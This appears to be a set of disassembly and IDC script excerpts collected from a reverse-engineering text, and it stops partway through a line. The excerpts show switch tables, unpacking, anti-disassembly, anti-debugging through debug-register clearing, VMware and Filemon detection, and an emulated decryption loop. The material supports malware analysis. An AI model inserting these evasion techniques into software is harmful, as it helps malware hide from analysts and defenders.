["```\nswitch (value) {\n   case 1:\n      //code executed when value == 1\n      break;\n   case 211:\n      //code executed when value == 211\n      break;\n   case 295:\n      //code executed when value == 295\n      break;\n   case 462:\n      //code executed when value == 462\n      break;\n   case 1093:\n      //code executed when value == 1093\n      break;\n   case 1839:\n      //code executed when value == 1839\n      break;\n}\n```", "```\nswitch (value) {\n   case 1:\n      //code executed when value == 1\n      break;\n   case 2:\n      //code executed when value == 2\n      break;\n   case 3:\n      //code executed when value == 3\n      break;\n   case 4:\n      //code executed when value == 4\n      break;\n   case 5:\n      //code executed when value == 5\n      break;\n   case 6:\n      //code executed when value == 6\n      break;\n}\n```", "```\n.text:00401155         mov     edx, [ebp+arg_0]\n .text:00401158         cmp     edx, 0Ch        ; switch 13 cases\n  .text:0040115B         ja    loc_4011F1      ; default\n  .text:0040115B                                   ; jumptable 00401161 case 0\n  .text:00401161         jmp     ds:off_401168[edx*4] ; switch jump\n  .text:00401161 ; ---------------------------------------------------------------\n .text:00401168 off_401168 dd offset loc_4011F1\n  ; DATA XREF: sub_401150+11↑r\n  .text:00401168         dd offset loc_40119C ; jump table for switch statement\n  .text:00401168         dd offset loc_4011A1\n  .text:00401168         dd offset loc_4011A6\n  .text:00401168         dd offset loc_4011AB\n  .text:00401168         dd offset loc_4011B3\n  .text:00401168         dd offset loc_4011BB\n  .text:00401168         dd offset loc_4011C3\n  .text:00401168         dd offset loc_4011CB\n  .text:00401168         dd offset loc_4011D3\n  .text:00401168         dd offset loc_4011DB\n  .text:00401168         dd offset loc_4011E3\n  .text:00401168         dd offset loc_4011EB\n  .text:0040119C ; ---------------------------------------------------------------\n  .text:0040119C\n  .text:0040119C loc_40119C:                 ; CODE XREF: sub_401150+11↑j\n  .text:0040119C                             ; DATA XREF: sub_401150:off_401168↑o\n .text:0040119C         mov     eax, [ebp+arg_4] ; jumptable 00401161 case 1\n```", "```\n.text:004013D5             mov     ecx, [ebp+var_8]\n  .text:004013D8        sub     ecx, 1\n  .text:004013DB              mov     [ebp+var_8], ecx\n  .text:004013DE              cmp     [ebp+var_8], 0Bh ; switch 12 cases\n  .text:004013E2             ja      loc_40146E      ; jumptable 004013EB default case\n  .text:004013E8             mov     edx, [ebp+var_8]\n  .text:004013EB             jmp     ds:off_401478[edx*4] ; switch jump\n  .text:004013F2\n .text:004013F2 loc_4013F2:                          ; DATA XREF:\n  .text:off_401478?o\n  .text:004013F2             mov     eax, [ebp+arg_4] ; jumptable 004013EB \ncase 0\n  ... ; REMAINDER OF FUNCTION EXCLUDED FOR BREVITY\n  .text:00401477            retn\n  .text:00401477 sub_4013B0 endp\n  .text:00401477 ; -------------------------------------------------------------\n .text:00401478 off_401478 dd offset \nloc_4013F2  ; DATA XREF: sub_4013B0+3B↓r\n  .text:00401478            dd offset loc_4013FA  ; jump table for switch statement\n  .text:00401478            dd offset loc_401402\n  .text:00401478            dd offset loc_40140A\n  .text:00401478            dd offset loc_401415\n  .text:00401478            dd offset loc_401420\n  .text:00401478            dd offset loc_40142B\n  .text:00401478            dd offset loc_401436\n  .text:00401478            dd offset loc_401441\n  .text:00401478            dd offset loc_40144C\n  .text:00401478            dd offset loc_401458\n  .text:00401478            dd offset loc_401464\n```", "```\n.text:004011FA          cmp     [ebp+arg_0], 0Ch ; switch 13 cases\n  .text:004011FE              ja  loc_40129D      ; jumptable 00401210 case 0\n  .text:00401204              mov     eax, [ebp+arg_0]\n  .text:00401207              shl     eax, 2\n  .text:0040120A         mov     eax,  ds:off_402010[eax]\n  .text:00401210         jmp     eax             ; switch jump\n  .text:00401212\n  .text:00401212  loc_401212:                          ; DATA XREF:\n  .rdata:off_402010 o\n  .text:00401212        mov     eax, [ebp+arg_4] ; jumptable 00401210 case 1\n  ... ; REMAINDER OF .text SECTION EXCLUDED FOR BREVITY\n .rdata:00402010 off_402010  dd offset \nloc_40129D   ; DATA XREF: sub_4011ED+1D↑r\n  .rdata:00402010            dd offset \nloc_401212   ; jump table for switch statement\n  .rdata:00402010            dd offset loc_40121D\n  .rdata:00402010            dd offset loc_401225\n  .rdata:00402010            dd offset loc_40122D\n  .rdata:00402010            dd offset loc_40123C\n  .rdata:00402010            dd offset loc_40124B\n  .rdata:00402010            dd offset loc_40125A\n  .rdata:00402010            dd offset loc_401265\n  .rdata:00402010            dd offset loc_401270\n  .rdata:00402010            dd offset loc_40127B\n  .rdata:00402010            dd offset loc_401287\n  .rdata:00402010            dd offset loc_401293\n```", "```\n.text:08048365          mov     dword ptr [esp], offset _term_proc ; func\n.text:0804836C        call    _atexit\n.text:08048371        call    _init_proc\n.text:08048376          lea     eax, [ebp+arg_0]\n.text:08048379          mov     [esp+8], esi\n.text:0804837D          mov     [esp+4], eax\n.text:08048381          mov     [esp], ebx\n.text:08048384        call    sub_8048400\n.text:08048389        mov     [esp], eax      ; status\n.text:0804838C        call    _exit\n```", "```\n.text:080482B0 start           proc near\n.text:080482B0                 xor     ebp, ebp\n.text:080482B2                 pop     esi\n.text:080482B3                 mov     ecx, esp\n.text:080482B5                 and     esp, 0FFFFFFF0h\n.text:080482B8                 push    eax\n.text:080482B9                 push    esp\n.text:080482BA                 push    edx\n.text:080482BB                push    offset sub_80483C0\n.text:080482C0                push    offset sub_80483D0\n.text:080482C5                 push    ecx\n.text:080482C6                 push    esi\n.text:080482C7                push    offset loc_8048384\n.text:080482CC                 call    ___libc_start_main\n.text:080482D1                 hlt\n.text:080482D1 start           endp\n```", "```\n.text:08048384 loc_8048384:                       ; DATA XREF: start+17↑o\n.text:08048384          lea     ecx, [esp+4]       ; address of arg_0 into ecx\n.text:08048388          and     esp, 0FFFFFFF0h    ; 16 byte align esp\n.text:0804838B          push    dword ptr [ecx-4]  ; push copy of return address\n.text:0804838E         push    ebp                ; save caller's ebp\n.text:0804838F         mov\nebp, esp           ; initialize our frame pointer\n.text:08048391          push    ecx                ; save ecx\n.text:08048392         sub     esp, 24h           ; allocate locals\n```", "```\n.text:00401000 start     proc near\n.text:00401000\n.text:00401000 var_28    = dword ptr −28h\n.text:00401000 var_24    = dword ptr −24h\n.text:00401000 var_20    = dword ptr −20h\n.text:00401000 var_2     = word ptr −2\n.text:00401000\n.text:00401000           push    ebp\n.text:00401001           mov     ebp, esp\n.text:00401003           sub     esp, 28h\n.text:00401006           and     esp, 0FFFFFFF0h\n.text:00401009           fnstcw  [ebp+var_2]\n.text:0040100C           movzx   eax, [ebp+var_2]\n.text:00401010           and     ax, 0F0C0h\n.text:00401014           mov     [ebp+var_2], ax\n.text:00401018           movzx   eax, [ebp+var_2]\n.text:0040101C           or      ax, 33Fh\n.text:00401020           mov     [ebp+var_2], ax\n.text:00401024           fldcw   [ebp+var_2]\n.text:00401027          mov     [esp+28h+var_28], offset sub_4010B0\n.text:0040102E          call    sub_401120\n```", "```\n.text:00401280 start           proc near\n.text:00401280\n.text:00401280 var_8           = dword ptr −8\n.text:00401280\n.text:00401280                 push    ebp\n.text:00401281                 mov     ebp, esp\n.text:00401283                 sub     esp, 8\n.text:00401286                 mov     [esp+8+var_8], 1\n.text:0040128D                 call    ds:__set_app_type\n.text:00401293                call    sub_401150\n.text:00401293 start           endp\n```", "```\n.text:0040122A                 call    __p__environ\n.text:0040122F                 mov     eax, [eax]\n.text:00401231                mov     [esp+8], eax\n.text:00401235                 mov     eax, ds:dword_404000\n.text:0040123A                mov     [esp+4], eax\n.text:0040123E                 mov     eax, ds:dword_404004\n.text:00401243                mov     [esp], eax\n.text:00401246                call    sub_401395\n.text:0040124B                 mov     ebx, eax\n.text:0040124D                 call    _cexit\n.text:00401252                 mov     [esp], ebx\n.text:00401255                 call    ExitProcess\n```", "```\n.text:0040134B start           proc near\n.text:0040134B                 call    ___security_init_cookie\n.text:00401350                 jmp     ___tmainCRTStartup\n.text:00401350 start           endp\n```", "```\n.text:004012D8                 mov     eax, envp\n.text:004012DD                 mov     dword_40ACF4, eax\n.text:004012E2                 push    eax             ; envp\n.text:004012E3                 push    argv            ; argv\n.text:004012E9                 push    argc            ; argc\n.text:004012EF                call    _main\n.text:004012F4                 add     esp, 0Ch\n.text:004012F7                 mov     [ebp+var_1C], eax\n.text:004012FA                 cmp     [ebp+var_20], 0\n.text:004012FE                 jnz     short $LN35\n.text:00401300                 push    eax             ; uExitCode\n.text:00401301                 call    $LN27\n.text:00401306 $LN35:                      ; CODE XREF: ___tmainCRTStartup+169âj\n.text:00401306                 call    __cexit\n.text:0040130B                 jmp     short loc_40133B\n```", "```\n.text:00401041                push    offset off_4090B8\n.text:00401046                 push    0               ; lpModuleName\n.text:00401048                 call    GetModuleHandleA\n.text:0040104D                 mov     dword_409117, eax\n.text:00401052                 push    0          ; fake return value\n.text:00401054                 jmp     __startup\n```", "```\n.text:00406997                 mov     edx, dword_40BBFC\n.text:0040699D                push    edx\n.text:0040699E                 mov     ecx, dword_40BBF8\n.text:004069A4                push    ecx\n.text:004069A5                 mov     eax, dword_40BBF4\n.text:004069AA                push    eax\n.text:004069AB                call    dword ptr [esi+18h]\n.text:004069AE                 add     esp, 0Ch\n.text:004069B1                 push    eax             ; status\n.text:004069B2                 call    _exit\n```", "```\n.text:004018A4 start:\n.text:004018A4               push    offset dword_401994\n.text:004018A9               call    ThunRTMain\n```", "```\n.text:00401994 dword_401994    dd 21354256h, 2A1FF0h,\n 3 dup(0) ; DATA XREF: .text:start↑o\n.text:004019A8                 dd 7Eh, 2 dup(0)\n.text:004019B4                 dd 0A0000h, 409h, 0\n.text:004019C0                dd offset sub_4045D0\n.text:004019C4                 dd offset dword_401A1C\n.text:004019C8                 dd 30F012h, 0FFFFFF00h, 8, 2\n dup(1), 0E9h, 401944h, 4018ECh\n.text:004019C8                 dd 4018B0h, 78h, 7Dh, 82h, 83h, 4 dup(0)\n```", "```\n .text:00411050\n sub_411050      proc near               ; CODE XREF: start_0+3↓p\n  .text:00411050                jmp     sub_412AE0\n   .text:00411050 sub_411050     endp\n  ...\n .text:0041110E start           proc near\n    .text:0041110E                jmp     start_0\n  .text:0041110E start           endp\n  ...\n .text:00411920 start_0         proc near               ; CODE XREF: start↑j\n  .text:00411920                 push    ebp\n  .text:00411921                 mov     ebp, esp\n  .text:00411923                call    sub_411050\n  .text:00411928                 call    sub_411940\n  .text:0041192D                 pop     ebp\n  .text:0041192E                 retn\n  .text:0041192E start_0         endp\n```", "```\n.text:00411500                 push    ebp\n.text:00411501                 mov     ebp, esp\n.text:00411503                sub     esp, 0F0h\n.text:00411509                 push    ebx\n.text:0041150A                 push    esi\n.text:0041150B                 push    edi\n.text:0041150C                lea     edi, [ebp+var_F0]\n.text:00411512                 mov     ecx, 3Ch\n.text:00411517                 mov     eax, 0CCCCCCCCh\n.text:0041151C                 rep stosd\n.text:0041151E                mov     [ebp+var_8], 0\n.text:00411525                 mov     [ebp+var_14], 1\n.text:0041152C                 mov     [ebp+var_20], 2\n.text:00411533                 mov     [ebp+var_2C], 3\n```", "```\nmemset(&var_F0, 0xCC, 240);\n```", "```\n.text:004018D0                 push    ebp\n.text:004018D1                 mov     ebp, esp\n.text:004018D3                sub     esp, 10h\n.text:004018D6                mov     [ebp+var_4], 0\n.text:004018DD                 mov     [ebp+var_C], 1\n.text:004018E4                 mov     [ebp+var_8], 2\n.text:004018EB                 mov     [ebp+var_10], 3\n```", "```\n.text:000158AC sub_158AC       proc near\n  .text:000158AC\n .text:000158AC arg_0           = dword ptr  4\n  .text:000158AC\n  .text:000158AC                 push    [esp+arg_0]\n  .text:000158B0              mov     edx, [eax+118h]\n  .text:000158B6                 push    eax\n  .text:000158B7              movzx   ecx, cl\n  .text:000158BA                 mov     cl, [edx+ecx+0A0h]\n```", "```\nint __usercall sub_158AC<eax>(struc_1 *<eax>, unsigned __int8 index<cl>, int)\n```", "```\n.text:00014B9F       lea     eax, [ebp+var_218] ; struc_1 *\n.text:00014BA5       mov     cl, 1           ; index\n.text:00014BA7       push    edx             ; int\n.text:00014BA8        call    sub_158AC\n```", "```\n.text:0001669E sub_1669E       proc near\n  .text:0001669E\n .text:0001669E arg_0           = byte ptr  4\n  .text:0001669E\n  .text:0001669E              mov     eax, [esi+18h]\n  .text:000166A1                 add     eax, 684h\n  .text:000166A6                 cmp     [esp+arg_0], 0\n```", "```\nLOAD:0A04B0D1                 call  near ptr loc_A04B0D6+1\n  LOAD:0A04B0D6\n  LOAD:0A04B0D6 loc_A04B0D6:                      ; CODE XREF: start+11↓p\n LOAD:0A04B0D6                 mov     dword ptr [eax-73h], 0FFEB0A40h\n  LOAD:0A04B0D6 start           endp\n  LOAD:0A04B0D6\n  LOAD:0A04B0DD\n  LOAD:0A04B0DD loc_A04B0DD:                      ; CODE XREF: LOAD:0A04B14C↓j\n  LOAD:0A04B0DD                 loopne  loc_A04B06F\n  LOAD:0A04B0DF                 mov     dword ptr [eax+56h], 5CDAB950h\n LOAD:0A04B0E6                 iret\n  LOAD:0A04B0E6 ;---------------------------------------------------------------\n LOAD:0A04B0E7                 db 47h\n  LOAD:0A04B0E8                 db 31h, 0FFh, 66h\n    LOAD:0A04B0EB ;---------------------------------------------------------------\n  LOAD:0A04B0EB\n  LOAD:0A04B0EB loc_A04B0EB:                      ; CODE XREF: LOAD:0A04B098↑j\n  LOAD:0A04B0EB                 mov     edi, 0C7810D98h\n```", "```\nLOAD:0A04B0D1                 call    loc_A04B0D7\n  LOAD:0A04B0D1 ;------------------------------------------------------------\n LOAD:0A04B0D6                 db 0C7h ; ¦\n  LOAD:0A04B0D7 ;------------------------------------------------------------\n  LOAD:0A04B0D7\n  LOAD:0A04B0D7 loc_A04B0D7:                   ; CODE XREF: start+11↑p\n LOAD:0A04B0D7                 pop     eax\n  LOAD:0A04B0D8                 lea     eax, [eax+0Ah]\n  LOAD:0A04B0DB\n  LOAD:0A04B0DB loc_A04B0DB:                   ; CODE XREF: start:loc_A04B0DB↑j\n LOAD:0A04B0DB                 jmp     short near ptr loc_A04B0DB+1\n  LOAD:0A04B0DB start           endp\n  LOAD:0A04B0DB\n  LOAD:0A04B0DB ;------------------------------------------------------------\n  LOAD:0A04B0DD                 db 0E0h ; a\n```", "```\n LOAD:0A04B0D7                 pop     eax\n LOAD:0A04B0D8                 lea     eax, [eax+0Ah]\n  LOAD:0A04B0D8 ; --------------------------------------------------------------\n  LOAD:0A04B0DB                 db 0EBh ; d\n  LOAD:0A04B0DC ; --------------------------------------------------------------\n LOAD:0A04B0DC                 jmp     eax\n  LOAD:0A04B0DC start           endp\n```", "```\n .text:00401000                 xor     eax, eax\n .text:00401002                 jz      short near ptr loc_401009+1\n .text:00401004                 mov     ebx, [eax]\n .text:00401006                 mov     [ecx-4], ebx\n  .text:00401009\n  .text:00401009 loc_401009:                     ; CODE XREF: .text:00401002↑j\n .text:00401009                 call    near ptr 0ADFEFFC6h\n  .text:0040100E                 ficom   word ptr [eax+59h]\n```", "```\n.text:00401000                 xor     eax, eax\n  .text:00401002                 jz      short loc_40100A\n  .text:00401004                 mov     ebx, [eax]\n  .text:00401006                 mov     [ecx-4], ebx\n  .text:00401006 ; -------------------------------------------------------------\n .text:00401009                 db 0E8h ; F\n  .text:0040100A ; -------------------------------------------------------------\n  .text:0040100A\n  .text:0040100A loc_40100A:                     ; CODE XREF: .text:00401002↑j\n .text:0040100A                 mov     eax, 0DEADBEEFh\n  .text:0040100F                 push    eax\n  .text:00401010                 pop     ecx\n```", "```\nLOAD:0A04B3BE                 mov     ecx, 7F131760h  ; ecx = 7F131760\n  LOAD:0A04B3C3                 xor     edi, edi        ; edi = 00000000\n  LOAD:0A04B3C5                 mov     di, 1156h       ; edi = 00001156\n  LOAD:0A04B3C9                 add     edi, 133AC000h  ; edi = 133AD156\n  LOAD:0A04B3CF                 xor     ecx, edi        ; ecx = 6C29C636\n    LOAD:0A04B3D1                 sub     ecx, 622545CEh  ; ecx = 0A048068\n  LOAD:0A04B3D7                 mov     edi, ecx        ; edi = 0A048068\n  LOAD:0A04B3D9                 pop     eax\n  LOAD:0A04B3DA                 pop     esi\n  LOAD:0A04B3DB                 pop     ebx\n  LOAD:0A04B3DC                 pop     edx\n  LOAD:0A04B3DD                 pop     ecx\n LOAD:0A04B3DE                 xchg    edi, [esp]      ; TOS = 0A048068\n  LOAD:0A04B3E1                 retn                    ; return to 0A048068\n```", "```\n .shrink:0041D07A        call    $+5\n .shrink:0041D07F        pop     ebp\n .shrink:0041D080        lea     eax, [ebp+46h]  ; eax holds 0041D07F + 46h\n  .shrink:0041D081        inc     ebp\n .shrink:0041D083        push    eax\n  .shrink:0041D084        xor     eax, eax\n .shrink:0041D086        push    dword ptr fs:[eax]\n .shrink:0041D089        mov     fs:[eax], esp\n .shrink:0041D08C        int     3               ; Trap to Debugger\n  .shrink:0041D08D        nop\n  .shrink:0041D08E        mov     eax, eax\n  .shrink:0041D090        stc\n  .shrink:0041D091        nop\n  .shrink:0041D092        lea     eax, ds:1234h[ebx*2]\n  .shrink:0041D099        clc\n  .shrink:0041D09A        nop\n  .shrink:0041D09B        shr     ebx, 5\n  .shrink:0041D09E        cld\n  .shrink:0041D09F        nop\n  .shrink:0041D0A0        rol     eax, 7\n  .shrink:0041D0A3        nop\n  .shrink:0041D0A4        nop\n .shrink:0041D0A5        xor     ebx, ebx\n .shrink:0041D0A7        div     ebx             ; Divide by zero\n  .shrink:0041D0A9        pop     dword ptr fs:0\n```", "```\n.shrink:0041D0C5 sub_41D0C5      proc near     ; DATA XREF: .stack:0012FF9C↑o\n  .shrink:0041D0C5\n  .shrink:0041D0C5 pEXCEPTION_RECORD  = dword ptr  4\n  .shrink:0041D0C5 arg_4               = dword ptr  8\n .shrink:0041D0C5 pCONTEXT            = dword ptr  0Ch\n    .shrink:0041D0C5\n .shrink:0041D0C5        mov     eax, [esp+pEXCEPTION_RECORD]\n .shrink:0041D0C9        mov     ecx, [esp+pCONTEXT]  ; Address of SEH CONTEXT\n .shrink:0041D0CD        inc     [ecx+CONTEXT._Eip]   ; Modify saved eip\n .shrink:0041D0D3        mov     eax, [eax]           ; Obtain exception type\n .shrink:0041D0D5        cmp     eax, EXCEPTION_INT_DIVIDE_BY_ZERO\n  .shrink:0041D0DA        jnz     short loc_41D100\n  .shrink:0041D0DC        inc     [ecx+CONTEXT._Eip]   ; Modify eip again\n .shrink:0041D0E2\n        xor     eax, eax             ; Zero x86 debug registers\n  .shrink:0041D0E4        and     [ecx+CONTEXT.Dr0], eax\n  .shrink:0041D0E7        and     [ecx+CONTEXT.Dr1], eax\n  .shrink:0041D0EA        and     [ecx+CONTEXT.Dr2], eax\n  .shrink:0041D0ED        and     [ecx+CONTEXT.Dr3], eax\n  .shrink:0041D0F0        and     [ecx+CONTEXT.Dr6], 0FFFF0FF0h\n  .shrink:0041D0F7        and     [ecx+CONTEXT.Dr7], 0DC00h\n  .shrink:0041D0FE        jmp     short locret_41D160\n```", "```\nName   Start    End      R W X D L Align Base Type   Class\n UPX0   00401000 00407000 R W X . L para  0001 public CODE\n UPX1   00407000 00409000 R W X . L para  0002 public CODE\n  UPX2   00409000 0040908C R W . . L para  0003 public DATA\n  .idata 0040908C 004090C0 R W . . L para  0003 public XTRN\n  UPX2   004090C0 0040A000 R W . . L para  0003 public DATA\n```", "```\nUPX0:00401000 ;  Section 1\\. (virtual address 00001000)\nUPX0:00401000 ;  Virtual size                  : 00006000 (  24576.)\nUPX0:00401000 ;Section size in file          : 00000000 (      0.)\nUPX0:00401000 ;  Offset to raw data for section: 00000200\nUPX0:00401000 ;Flags E0000080: Bss Executable Readable Writable\n```", "```\nAddress   Ordinal   Name                  Library\n0041EC2E            GetModuleHandleA      kernel32\n0041EC36            MessageBoxA           user32\n```", "```\nAddress   Ordinal   Name                  Library\n0040908C            LoadLibraryA          KERNEL32\n00409090            GetProcAddress        KERNEL32\n00409094            ExitProcess           KERNEL32\n0040909C            RegCloseKey           ADVAPI32\n004090A4            atoi                  CRTDLL\n004090AC            ExitWindowsEx         USER32\n004090B4            InternetOpenA         WININET\n004090BC            recv                  wsock32\n```", "```\nUPX1:0040886C loc_40886C:                       ; CODE XREF: start+12E↓j\n  UPX1:0040886C        mov     eax, [edi]\n  UPX1:0040886E        or      eax, eax\n  UPX1:00408870        jz      short loc_4088AE\n  UPX1:00408872        mov     ebx, [edi+4]\n  UPX1:00408875        lea     eax, [eax+esi+8000h]\n  UPX1:0040887C        add     ebx, esi\n  UPX1:0040887E        push    eax\n  UPX1:0040887F        add     edi, 8\n UPX1:00408882        call    dword ptr [esi+808Ch] ; LoadLibraryA\n  UPX1:00408888        xchg    eax, ebp\n  UPX1:00408889\n  UPX1:00408889 loc_408889:                       ; CODE XREF: start+146↓j\n  UPX1:00408889        mov     al, [edi]\n  UPX1:0040888B        inc     edi\n  UPX1:0040888C        or      al, al\n  UPX1:0040888E        jz      short loc_40886C\n  UPX1:00408890        mov     ecx, edi\n  UPX1:00408892        push    edi\n  UPX1:00408893        dec     eax\n  UPX1:00408894        repne scasb\n  UPX1:00408896        push    ebp\n UPX1:00408897        call    dword ptr [esi+8090h] ; GetProcAddress\n    UPX1:0040889D        or      eax, eax\n  UPX1:0040889F        jz      short loc_4088A8\n UPX1:004088A1        mov     [ebx], eax            ; Save to import table\n  UPX1:004088A3        add     ebx, 4\n  UPX1:004088A6        jmp     short loc_408889\n```", "```\n.shrink:0041D1E4                 cmp     dword ptr [eax], 64616F4Ch\n.shrink:0041D1EA                 jnz     short loc_41D226\n.shrink:0041D1EC                 cmp     dword ptr [eax+4], 7262694Ch\n.shrink:0041D1F3                 jnz     short loc_41D226\n.shrink:0041D1F5                 cmp     dword ptr [eax+8], 41797261h\n.shrink:0041D1FC                 jnz     short loc_41D226\n```", "```\n.shrink:0041D1E4                 cmp     dword ptr [eax], 'daoL'\n.shrink:0041D1EA                 jnz     short loc_41D226\n.shrink:0041D1EC                 cmp     dword ptr [eax+4], 'rbiL'\n.shrink:0041D1F3                 jnz     short loc_41D226\n.shrink:0041D1F5                 cmp     dword ptr [eax+8], 'Ayra'\n.shrink:0041D1FC                 jnz     short loc_41D226\n```", "```\n GetProcAddress : 8A0FB5E2\n  GetProcessAffinityMask : B9756EFE\n  GetProcessHandleCount : B50EB87C\n  GetProcessHeap : C246DA44\n  GetProcessHeaps : A18AAB23\n  GetProcessId : BE05ED07\n```", "```\nmov  eax, 0x564D5868    ; 'VMXh'\n  mov  ecx, 10\n  xor  ebx, ebx\n  mov  dx,  0x5658        ; 'VX'\n in   eax, dx\n```", "```\nif (FindWindow(\"FilemonClass\", NULL)) {\n   //exit because Filemon is running\n}\n```", "```\nLOAD:05371035 start           proc near\n  LOAD:05371035\n LOAD:05371035                 push    off_5371008\n LOAD:0537103B                 pushf\n LOAD:0537103C                 pusha\n LOAD:0537103D                 mov     ecx, dword_5371000\n  LOAD:05371043                 jmp     loc_5371082\n  ...\n  LOAD:05371082 loc_5371082:                       ; CODE XREF: start+E↑j\n LOAD:05371082                 call    sub_5371048\n  LOAD:05371087                 sal     byte ptr [ebx-2Bh], 1\n  LOAD:0537108A                 pushf\n  LOAD:0537108B                 xchg    al, [edx-11h]\n  LOAD:0537108E                 pop     ss\n  LOAD:0537108F                 xchg    eax, esp\n  LOAD:05371090                 cwde\n  LOAD:05371091                 aad     8Eh\n  LOAD:05371093                 push    ecx\n LOAD:05371094                 out     dx, eax\n  LOAD:05371095                 add     [edx-57E411A0h], bh\n  LOAD:0537109B                 push    ss\n  LOAD:0537109C                 rcr     dword ptr [esi+0Ch], cl\n    LOAD:0537109F                 push    cs\n  LOAD:053710A0                 sub     al, 70h\n  LOAD:053710A2                 cmp     ch, [eax+6Eh]\n  LOAD:053710A5                 cmp     dword ptr ds:0CBD35372h, 9C38A8BCh\n  LOAD:053710AF                 and     al, 0F4h\n LOAD:053710B1                 db      67h\n```", "```\nauto ecx;\necx = Dword(0x5371000);    //from instruction 0537103D\n```", "```\nLOAD:05371048 sub_5371048     proc near   ; CODE XREF: start:loc_5371082↓p\n LOAD:05371048                 pop     esi\n LOAD:05371049                 mov     edi, esi\n LOAD:0537104B                 mov     ebx, dword_5371004\n  LOAD:05371051                 or      ebx, ebx\n LOAD:05371053                 jz      loc_537107F\n LOAD:05371059                 xor     edx, edx\n LOAD:0537105B loc_537105B:                ; CODE XREF: sub_5371048+35↓j\n  LOAD:0537105B                 mov     eax, 8\n LOAD:05371060 loc_5371060:                ; CODE XREF: sub_5371048+2B↓j\n  LOAD:05371060                 shrd    edx, ebx, 1\n  LOAD:05371064                 shr     ebx, 1\n  LOAD:05371066                 jnb     loc_5371072\n  LOAD:0537106C                 xor     ebx, 0C0000057h\n  LOAD:05371072 loc_5371072:                ; CODE XREF: sub_5371048+1E↑j\n  LOAD:05371072                 dec     eax\n  LOAD:05371073                 jnz     short loc_5371060\n  LOAD:05371075                 shr     edx, 18h\n  LOAD:05371078                 lodsb\n    LOAD:05371079                 xor     al, dl\n  LOAD:0537107B                 stosb\n  LOAD:0537107C                 dec     ecx\n  LOAD:0537107D                 jnz     short loc_537105B\n  LOAD:0537107F loc_537107F:                ; CODE XREF: sub_5371048+B↑j\n  LOAD:0537107F                 popa\n  LOAD:05371080                 popf\n  LOAD:05371081                 retn\n```", "```\nauto ecx, esi, edi, ebx, edx;\necx = Dword(0x5371000);   //from instruction 0537103D\nesi = 0x05371087;         //from instruction 05371048\nedi = esi;                //from instruction 05371049\nebx = Dword(0x5371004);   //from instruction 0537104B\nedx = 0;                  //from instruction 05371059\n```", "```\nauto ecx, esi, edi, ebx, edx, eax, cf;\n  ecx = Dword(0x5371000);   //from instruction 0537103D\n  esi = 0x05371087;         //from instruction 05371048\n  edi = esi;                //from instruction 05371049\n  ebx = Dword(0x5371004);   //from instruction 0537104B\n  if (ebx != 0) {           //from instructions 05371051 and 05371053\n     edx = 0;               //from instruction 05371059\n     do {\n        eax = 8;            //from instruction 0537105B\n        do {\n           //IDC does not offer an equivalent of the x86 shrd instruction so we\n           //need to derive the behavior using several operations\n           edx = (edx\n >> 1) & 0x7FFFFFFF;   //perform unsigned shift right one bit\n           cf = ebx & 1;                    //remember the low bit of ebx\n           if (cf == 1) {                   //cf represents the x86 carry flag\n              edx = edx | 0x80000000;       //shift in the low bit of ebx if it is 1\n           }\n           ebx = (ebx >> 1) & 0x7FFFFFFF;   //perform unsigned shift right one bit\n           if (cf == 1) {                   //from instruction 05371066\n              ebx = ebx ^ 0xC0000057;       //from instruction 0537106C\n           }\n           eax--;                  //from instruction 05371072\n        } while (eax != 0);        //from instruction 05371073\n       edx = (edx >> 24) & 0xFF;  //perform unsigned shift right 24 bits\n       eax = Byte(esi++);         //from instruction 05371078\n        eax = eax ^ edx;           //from instruction 05371079\n       PatchByte(edi++, eax);     //from instruction 0537107B\n        ecx--;                     //from instruction 0537107C\n     } while (ecx != 0);           //from instruction 0537107D\n  }\n```", "```\neax = (eax & 0xFFFFFF00) | (Byte(esi++) & 0xFF);\n```", "```\nLOAD:0537107F                 popa\nLOAD:05371080                 popf\nLOAD:05371081                 retn\n```", "```\nLOAD:05371035 start           proc near\n  LOAD:05371035\n LOAD:05371035                 push    off_5371008\n  LOAD:0537103B                 pushf\n  LOAD:0537103C                 pusha\n```", "```\nLOAD:05371082 loc_5371082:                ; CODE XREF: start+E↑j\n  LOAD:05371082                 call    sub_5371048\n  LOAD:05371082 ; --------------------------------------------------------------\n  LOAD:05371087                 db    0\n  LOAD:05371088                 db    0\n  LOAD:05371089                 db    0\n  LOAD:0537108A                 db    0\n  LOAD:0537108B                 db    0\n  LOAD:0537108C                 db    0\n  LOAD:0537108D                 db    0\n  LOAD:0537108E                 db    0\n  LOAD:0537108F                 db    0\n  LOAD:05371090 ; --------------------------------------------------------------\n  LOAD:05371090\n  LOAD:05371090 loc_5371090:                ; DATA XREF: LOAD:off_5371008↑o\n LOAD:05371090                 pushf\n  LOAD:05371091                 pop     ebx\n  LOAD:05371092                 mov     esi, esp\n  LOAD:05371094                 call    sub_5371117\n  LOAD:05371099                 mov     ebp, edx\n  LOAD:0537109B                 cmp     ecx, 20h\n  LOAD:0537109E                 jl      loc_53710AB\n  LOAD:053710A4                 xor     eax, eax\n  LOAD:053710A6                 jmp     loc_53710B5\n```", "```\nUPX1:00408882                 call    dword ptr [esi+808Ch]\n```", "```\nx86emu: LoadLibrary called: KERNEL32.DLL (7C800000)\nx86emu: GetProcAddress called: ExitProcess (0x7C81CDDA)\nx86emu: GetProcAddress called: ExitThread (0x7C80C058)\nx86emu: GetProcAddress called: GetCurrentProcess (0x7C80DDF5)\nx86emu: GetProcAddress called: GetCurrentThread (0x7C8098EB)\nx86emu: GetProcAddress called: GetFileSize (0x7C810A77)\nx86emu: GetProcAddress called: GetModuleHandleA (0x7C80B6A1)\nx86emu: GetProcAddress called: CloseHandle (0x7C809B47)\n```", "```\nUPX1:00408897        call    dword ptr [esi+8090h] ; GetProcAddress\n  UPX1:0040889D        or      eax, eax\n  UPX1:0040889F        jz      short loc_4088A8\n UPX1:004088A1        mov     [ebx], eax            ; Save to import table\n  UPX1:004088A3        add     ebx, 4\n```", "```\nUPX0:00406270                 dd 7C81CDDAh\nUPX0:00406274                 dd 7C80C058h\nUPX0:00406278                 dd 7C80DDF5h\nUPX0:0040627C                 dd 7C8098EBh\n```", "```\nUPX0:00406270 ; void __stdcall ExitProcess(UINT uExitCode)\nUPX0:00406270 ExitProcess     dd 7C81CDDAh        ; DATA XREF: j_ExitProcess↑r\nUPX0:00406274 ; void __stdcall ExitThread(DWORD dwExitCode)\nUPX0:00406274 ExitThread      dd 7C80C058h        ; DATA XREF: j_ExitThread↑r\nUPX0:00406278 ; HANDLE __stdcall GetCurrentProcess()\nUPX0:00406278 GetCurrentProcess dd 7C80DDF5h      ; DATA XREF: j_GetCurrentProcess↑r\nUPX0:0040627C ; HANDLE 